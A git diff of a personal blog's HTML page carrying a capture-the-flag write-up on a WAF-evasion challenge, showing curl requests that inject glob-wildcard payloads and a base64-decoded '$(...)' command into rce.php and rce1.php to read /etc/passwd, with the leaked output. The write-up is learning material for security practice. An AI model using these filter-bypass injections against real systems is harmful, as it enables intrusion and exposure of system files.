@@ -4,8 +4,10 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=608e4123b24a1c67fb738164fd577d8b23f862b8">
+    <link rel="stylesheet" href="/assets/css/style.css?v=4bb90db7f9e77eea0d901f5a8ec3fde164b73e67">
 
+
+    
 <!-- Begin Jekyll SEO tag v2.6.1 -->
 <title>Null Ahmedabad WAF Writeup | Parth’s Blog</title>
 <meta name="generator" content="Jekyll v3.8.5" />
@@ -35,7 +37,6 @@
           <a href="../blog.html" class="btn">Blog</a>
           <a href="../resume.html" class="btn">Resume</a>
           <a href="https://github.com/Auror007/" class="btn btn-github"><span class="icon"></span>GitHub</a>
-          
 
         </section>
       </div>
@@ -43,17 +44,17 @@
 
     <div class="container">
       <section id="main_content">
-        <h3 id="null-ahmedabad-waf-writeup">Null Ahmedabad WAF Writeup</h3>
+        <h2 id="null-ahmedabad-waf-writeup">Null Ahmedabad WAF Writeup</h2>
 <p>Hello there!
 <br />
 <br />
-It is always a great experience with NullAhm.There was a wonderful CTF challenge made by @_x30r as a part of Null Monthly Meetup(26/4/2020).This is a documentation of my experience and my learning through this.So lets get right into this.
-<br />
-<br /></p>
+It is always a great experience with NullAhm.There was a wonderful CTF challenge made by @_x30r as a part of Null Monthly Meetup(26/4/2020).This is a documentation of my experience and my learning through this.Many people had solved this challenge using wonderful ways and way before I had solved it.Those answers were amazing please look at them in @NullAhm twitter.So let’s get right into this.</p>
+
+<p><br /></p>
 
 <p>The Other day, I searched for WAF evasion techniques. Just to get a rough idea what it is like dealing with WAF.I came across some wonderfull stuff by @Menin_TheMiddle. Worth a read.
 <br />
-<a href="https://medium.com/@themiddleblue">https://medium.com/@themiddleblue</a></p>
+<a href="https://medium.com/@themiddleblue" target="_blank">https://medium.com/@themiddleblue</a></p>
 
 <p>Now moving on to the original CTF.Here’s what it looks like.
 <br />
@@ -67,8 +68,8 @@ The line at the end says:
 <br />
 <code class="language-plaintext highlighter-rouge">Your aim is to get the contents of /etc/passwd using “cat” command only. Check /rce.php?cmd= and /rce1.php?cmd= but code for 1st challenge is available and can be easily solved!</code>
 <br /></p>
-<h2 id="rce1php">rce1.php</h2>
-<p>Now lets try to do what it says with curl.
+<h2 id="rcephp">rce.php</h2>
+<p>Now let’s try to do what it says with curl.
 <br /></p>
 <h4 id="request">Request:</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://35.215.137.8/rce.php?cmd<span class="o">=</span>
@@ -77,11 +78,12 @@ The line at the end says:
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Print /etc/passwd contents via <span class="nb">cat command </span>only!
 </code></pre></div></div>
 <p>I tried to append “cat /etc/passwd” in the url.Didn’t work. 
-I tried to download that file using wget but it only contained the above response in written in that file :(</p>
+I tried to download that file using wget but it only contained the above response in written in that file :(
+<br /></p>
 
-<p>Lets try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had <del>read</del> skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).</p>
+<p>Let’s try other things that were pointed by the hint given in Twitter Page of @NullAhm.It said that rce.php can be solved by the @Menin_TheMiddle articles.I had <del>read</del> skimmed through them. Now it was time to read it.This article focuses on wildcards also known as globbing patterns($man 7 glob).</p>
 
-<p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a></p>
+<p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a></p>
 
 <h4 id="wildcard-table">Wildcard Table</h4>
 
@@ -130,7 +132,7 @@ I tried to download that file using wget but it only contained the above respons
 
 <p><br />
 <br />
-Lets try wilcards.Some WAF may not filter such wildcards.
+Let’s try wilcards.Some WAF may not filter such wildcards.
 So, my payload was /bi?/ca?+/et?/passw? 
 <br /></p>
 <h4 id="request-1">Request:</h4>
@@ -149,7 +151,8 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 </code></pre></div></div>
 <p>Success! Now rce1.php won’t be as easy as this.</p>
 
-<p><br /></p>
+<h2 id="rce1php">rce1.php</h2>
+
 <h4 id="request-2">Request:</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://35.215.137.8/rce1.php?cmd<span class="o">=</span>/bi?/ca?+/et?/passw?
 </code></pre></div></div>
@@ -159,9 +162,9 @@ Now print /etc/passwd contents via <span class="nb">cat command </span>only!
 &lt;br&gt;/biopps?/caoops ?+/etoops ?/passwopps?&lt;/br&gt;
 
 </code></pre></div></div>
-<p>After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn’t restricting normal alphabetic characters.So the first though came into my mind was base64 encoding.Hence, I entered following command in my terminal.</p>
 
-<p><br /></p>
+<p>After fuzzing various inputs, I realized that it is replacing the characters in the original command.I felt this as a dead end.But, there was a funny thought in my mind that made me do one more thing before giving up.It wasn’t restricting normal alphabetic characters.So the first thought came into my mind was base64 encoding.Hence, I entered following command in my terminal.</p>
+
 <h4 id="terminal">Terminal:</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$echo</span> <span class="s2">"cat /etc/passwd"</span> | <span class="nb">base64</span> -      <span class="c"># '-' takes input file as output of previous echo. Same as $1.</span>
 <span class="nv">Y2F0IC9ldGMvcGFzc3dkCg</span><span class="o">==</span>
@@ -170,7 +173,7 @@ Now print /etc/passwd contents via <span class="nb">cat command </span>only!
 <span class="nv">$ </span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"Y2F0IC9ldGMvcGFzc3dkCg=="</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="si">)</span>  <span class="c">#Instead of printing this will execute the above output.</span>
 </code></pre></div></div>
 <p><br />
-Lets inject this in the rce1.php.
+Let’s inject this in the rce1.php.
 <br /></p>
 <h4 id="request-3">Request:</h4>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="s1">'http://35.215.137.8/rce1.php?cmd=$(echo+Y2F0IC9ldGMvcGFzc3dkCg==+|+base64+-d+-)'</span>
@@ -186,15 +189,22 @@ games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 ...
 </code></pre></div></div>
-<p>Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.
-$(echo Y2F0IC9ldGMvcGFzc3dkCg== oops | base64 -d -). Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string “oops”.Ctrl + x.Go to sleep.
+<p>Success! Never thought this would ever work, but it did.I wanted to see where I got lucky.I searched about how base64 encoding worked and found an interesting property.<br />
 <br />
-Thank You for reading my first blog.</p>
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$(echo+Y2F0IC9ldGMvcGFzc3dkCg==+oops+|+base64+-d+-)
+</code></pre></div></div>
+<p>Here all the + signs are converted to spaces as this string is parsed. And then base64 decoding uses blocks of 3 charcters to decode. It uses = or == as padding if one or two characters are remaining respectively to complete the count of 3.As the command decodes the string it does not care about the string “oops” because of the ‘+’ which was parsed as a space in between. base64 encoded data is a string of character that contains only a-z, A-Z, 0-9, + and / characters.No spaces.
+Ctrl + x.Shutdown.Go to sleep.
+<br /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Thank You! ;)
+</code></pre></div></div>
 
 
       </section>
     </div>
 
-    
+    <!--  -->
   </body>
 </html>
